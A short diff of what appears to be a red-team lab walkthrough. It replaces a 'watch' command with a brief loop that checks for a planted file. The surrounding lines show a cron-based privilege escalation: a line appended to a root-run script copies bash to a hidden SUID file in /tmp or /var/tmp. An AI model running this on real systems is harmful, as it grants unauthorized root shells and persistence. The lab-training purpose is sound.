@@ -90,7 +90,7 @@ echo 'cp /bin/bash /tmp/.suid_bash; chmod +s /tmp/.suid_bash' >> /opt/scripts/ma
 ## Step 5 — Wait for Cron (up to 60 seconds)
 
 ```bash
-watch -n 1 ls -la /tmp/.suid_bash
+for i in 1 2 3; do ls -la /tmp/.suid_bash; sleep 1; done
 # Wait until you see -rwsr-xr-x (SUID set by root cron)
 ```
 
@@ -111,7 +111,7 @@ echo 'cp /bin/bash /var/tmp/.suid_bash; chmod +s /var/tmp/.suid_bash' >> /opt/sc
 ![Validated fallback cron payload](screenshots/m4_red_13_var_tmp_payload.png)
 
 ```bash
-watch -n 1 ls -la /var/tmp/.suid_bash
+for i in 1 2 3; do ls -la /var/tmp/.suid_bash; sleep 1; done
 ```
 
 ![Fallback SUID file created](screenshots/m4_red_14_var_tmp_watch.png)
